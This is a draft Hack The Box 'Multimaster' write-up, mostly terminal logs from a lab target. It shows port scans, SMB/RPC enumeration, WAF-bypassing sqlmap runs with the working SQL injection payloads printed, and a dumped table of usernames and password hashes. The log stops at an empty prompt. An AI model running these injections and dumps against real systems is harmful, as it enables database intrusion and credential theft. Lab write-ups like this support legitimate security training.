---
title: HTB-Multimaster Writeup
date: 2026-09-24T14:00:00+08:00
draft: true
toc: true
images:
tags:
  - Hack
---
## Nmap 扫描

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sudo nmap --min-rate 10000 -p- 10.129.95.200 -oA Nmap/ports
[sudo] password for kali:
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-23 22:28 -0400
Nmap scan report for 10.129.95.200
Host is up (0.087s latency).
Not shown: 65507 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
49678/tcp open  unknown
49687/tcp open  unknown
49698/tcp open  unknown
49706/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ grep open Nmap/ports.nmap | awk -F '/' '{print $1}' | paste -sd ','
53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49687,49698,49706
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sudo nmap -sT -sC -sV -O -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49687,49698,49706 10.129.95.200 -oA Nmap/detail
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-23 22:32 -0400
Nmap scan report for 10.129.95.200
Host is up (0.088s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: MegaCorp
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 02:38:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2026-09-24T02:40:03+00:00; +6m06s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-09-24T02:33:13
|_Not valid after:  2056-09-24T02:33:13
| ms-sql-ntlm-info:
|   10.129.95.200:1433:
|     Target_Name: MEGACORP
|     NetBIOS_Domain_Name: MEGACORP
|     NetBIOS_Computer_Name: MULTIMASTER
|     DNS_Domain_Name: MEGACORP.LOCAL
|     DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|     DNS_Tree_Name: MEGACORP.LOCAL
|_    Product_Version: 10.0.14393
| ms-sql-info:
|   10.129.95.200:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2026-09-23T02:32:34
|_Not valid after:  2027-03-25T02:32:34
| rdp-ntlm-info:
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2026-09-24T02:39:52+00:00
|_ssl-date: 2026-09-24T02:40:02+00:00; +6m05s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49698/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 or 2012 R2 (97%), Microsoft Windows Server 2016 or Server 2019 (96%), Microsoft Windows Server 2012 (95%), Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows 10 1703 or Windows 11 21H2 (94%), Microsoft Windows Server 2016 (94%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 R2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2026-09-23T19:39:55-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: mean: 1h06m05s, deviation: 2h38m46s, median: 6m04s
| smb2-time:
|   date: 2026-09-24T02:39:52
|_  start_date: 2026-09-24T02:32:41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.13 seconds
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sudo bash -c 'echo "10.129.95.200 MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL" >> /etc/hosts'
[sudo] password for kali:
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ tail -n 1 /etc/hosts
10.129.95.200 MULTIMASTER.MEGACORP.LOCAL MEGACORP.LOCAL
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sudo ntpdate 10.129.95.200
2026-09-23 22:46:34.672597 (-0400) +365.092293 +/- 0.045131 10.129.95.200 s1 no-leap
CLOCK: time stepped by 365.092293
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ nxc smb 10.129.95.200 -u '' -p '' --shares
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:MEGACORP.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.200   445    MULTIMASTER      [+] MEGACORP.LOCAL\: 
SMB         10.129.95.200   445    MULTIMASTER      [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ rpcclient -U '' -N 10.129.95.200 -c 'lsaquery'
Domain Name: MEGACORP
Domain Sid: S-1-5-21-3167813660-1240564177-918740779
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ rpcclient -U '' -N 10.129.95.200 -c 'enumdomusers'
result was NT_STATUS_ACCESS_DENIED
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ rpcclient -U '' -N 10.129.95.200 -c 'enumdomgroups'
result was NT_STATUS_ACCESS_DENIED
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ impacket-lookupsid anonymous@10.129.95.200 20000
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Brute forcing SIDs at 10.129.95.200
[*] StringBinding ncacn_np:10.129.95.200[\pipe\lsarpc]
[-] SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
```

![](Pasted%20image%2020260927142217.png)

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ cat sql
POST /api/getColleagues HTTP/1.1
Host: 10.129.95.200
Content-Length: 12
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Origin: http://10.129.95.200
Referer: http://10.129.95.200/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"name":"a"}
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sqlmap -r sql --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy=http://127.0.0.1:8080
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.10.3#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:34:10 /2026-09-27/

[02:34:10] [INFO] parsing HTTP request from 'sql'
[02:34:10] [INFO] loading tamper module 'charunicodeescape'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[02:34:10] [INFO] testing connection to the target URL
[02:34:15] [INFO] checking if the target is protected by some kind of WAF/IPS
[02:34:20] [INFO] testing if the target URL content is stable
[02:34:25] [INFO] target URL content is stable
[02:34:25] [INFO] testing if (custom) POST parameter 'JSON name' is dynamic
[02:34:31] [INFO] (custom) POST parameter 'JSON name' appears to be dynamic
[02:34:36] [WARNING] heuristic (basic) test shows that (custom) POST parameter 'JSON name' might not be injectable
[02:34:41] [INFO] testing for SQL injection on (custom) POST parameter 'JSON name'
[02:34:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:37:37] [INFO] (custom) POST parameter 'JSON name' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable
[02:39:21] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'Microsoft SQL Server'
it looks like the back-end DBMS is 'Microsoft SQL Server'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[02:39:21] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[02:39:26] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
[02:39:36] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)'
[02:39:41] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)'
[02:39:47] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)'
[02:39:52] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)'
[02:39:57] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
[02:39:57] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace (integer column)'
[02:39:57] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Stacking (EXEC)'
[02:40:02] [INFO] testing 'Generic inline queries'
[02:40:07] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[02:40:13] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[02:40:37] [INFO] (custom) POST parameter 'JSON name' appears to be 'Microsoft SQL Server/Sybase stacked queries (comment)' injectable
[02:40:37] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[02:40:42] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF - comment)'
[02:41:07] [INFO] (custom) POST parameter 'JSON name' appears to be 'Microsoft SQL Server/Sybase time-based blind (IF - comment)' injectable
[02:41:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[02:41:07] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[02:41:17] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[02:41:38] [INFO] target URL appears to have 5 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[02:44:20] [WARNING] reflective value(s) found and filtering out
[02:44:20] [INFO] (custom) POST parameter 'JSON name' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) POST parameter 'JSON name' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"name":"a%' AND 4403=4403 AND 'LTzf%'='LTzf"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"a%';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
    Payload: {"name":"a%' WAITFOR DELAY '0:0:5'--"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-1475%' UNION ALL SELECT 41,41,41,41,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(66)+CHAR(81)+CHAR(116)+CHAR(70)+CHAR(115)+CHAR(118)+CHAR(107)+CHAR(87)+CHAR(98)+CHAR(101)+CHAR(73)+CHAR(69)+CHAR(112)+CHAR(67)+CHAR(101)+CHAR(116)+CHAR(110)+CHAR(82)+CHAR(73)+CHAR(98)+CHAR(109)+CHAR(98)+CHAR(108)+CHAR(83)+CHAR(100)+CHAR(74)+CHAR(77)+CHAR(103)+CHAR(98)+CHAR(65)+CHAR(103)+CHAR(79)+CHAR(71)+CHAR(72)+CHAR(106)+CHAR(80)+CHAR(84)+CHAR(99)+CHAR(115)+CHAR(111)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(98)+CHAR(113)-- JUHv"}
---
[02:44:20] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[02:44:20] [INFO] testing Microsoft SQL Server
[02:44:25] [INFO] confirming Microsoft SQL Server
[02:44:56] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 11 or 2016 or 2019 or 2022
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017
[02:44:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.95.200'
[02:44:56] [WARNING] your sqlmap version is outdated

[*] ending @ 02:44:56 /2026-09-27/
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sqlmap -r sql --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy=http://127.0.0.1:8080 --dbs
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.3#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:45:17 /2026-09-27/

[02:45:17] [INFO] parsing HTTP request from 'sql'
[02:45:17] [INFO] loading tamper module 'charunicodeescape'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[02:45:17] [INFO] resuming back-end DBMS 'microsoft sql server'
[02:45:17] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"name":"a%' AND 4403=4403 AND 'LTzf%'='LTzf"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"a%';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
    Payload: {"name":"a%' WAITFOR DELAY '0:0:5'--"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-1475%' UNION ALL SELECT 41,41,41,41,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(66)+CHAR(81)+CHAR(116)+CHAR(70)+CHAR(115)+CHAR(118)+CHAR(107)+CHAR(87)+CHAR(98)+CHAR(101)+CHAR(73)+CHAR(69)+CHAR(112)+CHAR(67)+CHAR(101)+CHAR(116)+CHAR(110)+CHAR(82)+CHAR(73)+CHAR(98)+CHAR(109)+CHAR(98)+CHAR(108)+CHAR(83)+CHAR(100)+CHAR(74)+CHAR(77)+CHAR(103)+CHAR(98)+CHAR(65)+CHAR(103)+CHAR(79)+CHAR(71)+CHAR(72)+CHAR(106)+CHAR(80)+CHAR(84)+CHAR(99)+CHAR(115)+CHAR(111)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(98)+CHAR(113)-- JUHv"}
---
[02:45:22] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[02:45:22] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2019 or 2022 or 2016 or 11
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017
[02:45:22] [INFO] fetching database names
[02:45:27] [WARNING] reflective value(s) found and filtering out
available databases [5]:
[*] Hub_DB
[*] master
[*] model
[*] msdb
[*] tempdb

[02:45:27] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.95.200'
[02:45:27] [WARNING] your sqlmap version is outdated

[*] ending @ 02:45:27 /2026-09-27/
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sqlmap -r sql --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy=http://127.0.0.1:8080 -D Hub_DB --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.10.3#stable}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:47:00 /2026-09-27/

[02:47:00] [INFO] parsing HTTP request from 'sql'
[02:47:00] [INFO] loading tamper module 'charunicodeescape'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[02:47:00] [INFO] resuming back-end DBMS 'microsoft sql server'
[02:47:00] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"name":"a%' AND 4403=4403 AND 'LTzf%'='LTzf"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"a%';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
    Payload: {"name":"a%' WAITFOR DELAY '0:0:5'--"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-1475%' UNION ALL SELECT 41,41,41,41,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(66)+CHAR(81)+CHAR(116)+CHAR(70)+CHAR(115)+CHAR(118)+CHAR(107)+CHAR(87)+CHAR(98)+CHAR(101)+CHAR(73)+CHAR(69)+CHAR(112)+CHAR(67)+CHAR(101)+CHAR(116)+CHAR(110)+CHAR(82)+CHAR(73)+CHAR(98)+CHAR(109)+CHAR(98)+CHAR(108)+CHAR(83)+CHAR(100)+CHAR(74)+CHAR(77)+CHAR(103)+CHAR(98)+CHAR(65)+CHAR(103)+CHAR(79)+CHAR(71)+CHAR(72)+CHAR(106)+CHAR(80)+CHAR(84)+CHAR(99)+CHAR(115)+CHAR(111)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(98)+CHAR(113)-- JUHv"}
---
[02:47:05] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[02:47:05] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 11 or 10 or 2016 or 2022 or 2019
web application technology: ASP.NET 4.0.30319, ASP.NET, Microsoft IIS 10.0
back-end DBMS: Microsoft SQL Server 2017
[02:47:05] [INFO] fetching tables for database: Hub_DB
[02:47:10] [WARNING] reflective value(s) found and filtering out
Database: Hub_DB
[2 tables]
+------------+
| Colleagues |
| Logins     |
+------------+

[02:47:10] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.95.200'
[02:47:10] [WARNING] your sqlmap version is outdated

[*] ending @ 02:47:10 /2026-09-27/
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ sqlmap -r sql --tamper=charunicodeescape --delay 5 --level 5 --risk 3 --batch --proxy=http://127.0.0.1:8080 -D Hub_DB -T Logins --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.3#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:48:31 /2026-09-27/

[02:48:31] [INFO] parsing HTTP request from 'sql'
[02:48:31] [INFO] loading tamper module 'charunicodeescape'
JSON data found in POST body. Do you want to process it? [Y/n/q] Y
[02:48:31] [INFO] resuming back-end DBMS 'microsoft sql server'
[02:48:31] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON name ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: {"name":"a%' AND 4403=4403 AND 'LTzf%'='LTzf"}

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: {"name":"a%';WAITFOR DELAY '0:0:5'--"}

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF - comment)
    Payload: {"name":"a%' WAITFOR DELAY '0:0:5'--"}

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: {"name":"-1475%' UNION ALL SELECT 41,41,41,41,CHAR(113)+CHAR(113)+CHAR(120)+CHAR(107)+CHAR(113)+CHAR(66)+CHAR(81)+CHAR(116)+CHAR(70)+CHAR(115)+CHAR(118)+CHAR(107)+CHAR(87)+CHAR(98)+CHAR(101)+CHAR(73)+CHAR(69)+CHAR(112)+CHAR(67)+CHAR(101)+CHAR(116)+CHAR(110)+CHAR(82)+CHAR(73)+CHAR(98)+CHAR(109)+CHAR(98)+CHAR(108)+CHAR(83)+CHAR(100)+CHAR(74)+CHAR(77)+CHAR(103)+CHAR(98)+CHAR(65)+CHAR(103)+CHAR(79)+CHAR(71)+CHAR(72)+CHAR(106)+CHAR(80)+CHAR(84)+CHAR(99)+CHAR(115)+CHAR(111)+CHAR(113)+CHAR(107)+CHAR(122)+CHAR(98)+CHAR(113)-- JUHv"}
---
[02:48:36] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[02:48:36] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 2016 or 2022 or 11 or 10 or 2019
web application technology: ASP.NET 4.0.30319, Microsoft IIS 10.0, ASP.NET
back-end DBMS: Microsoft SQL Server 2017
[02:48:36] [INFO] fetching columns for table 'Logins' in database 'Hub_DB'
[02:48:42] [WARNING] reflective value(s) found and filtering out
[02:48:42] [INFO] fetching entries for table 'Logins' in database 'Hub_DB'
[02:48:42] [WARNING] in case of table dumping problems (e.g. column entry order) you are advised to rerun with '--force-pivoting'
[02:53:12] [INFO] recognized possible password hashes in column 'password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[02:53:12] [INFO] using hash method 'sha384_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[02:53:12] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[02:53:12] [INFO] starting dictionary-based cracking (sha384_generic_passwd)
[02:53:12] [INFO] starting 8 processes
[02:53:14] [WARNING] no clear password(s) found
Database: Hub_DB
Table: Logins
[17 entries]
+----+--------------------------------------------------------------------------------------------------+----------+
| id | password                                                                                         | username |
+----+--------------------------------------------------------------------------------------------------+----------+
| 1  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | sbauer   |
| 2  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | okent    |
| 3  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ckane    |
| 4  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | kpage    |
| 5  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | shayna   |
| 6  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | james    |
| 7  | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | cyork    |
| 8  | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | rmartin  |
| 9  | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zac      |
| 10 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | jorden   |
| 11 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | alyx     |
| 12 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | ilee     |
| 13 | fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa | nbourne  |
| 14 | 68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813 | zpowers  |
| 15 | 9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739 | aldom    |
| 16 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | minatotw |
| 17 | cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc | egre55   |
+----+--------------------------------------------------------------------------------------------------+----------+

[02:53:14] [INFO] table 'Hub_DB.dbo.Logins' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.129.95.200/dump/Hub_DB/Logins.csv'
[02:53:14] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.95.200'
[02:53:14] [WARNING] your sqlmap version is outdated

[*] ending @ 02:53:14 /2026-09-27/
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
└─$ cat sha384_uniq.txt
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
```

```bash
┌──(kali㉿kali)-[~/Work/Kali/Multimaster]
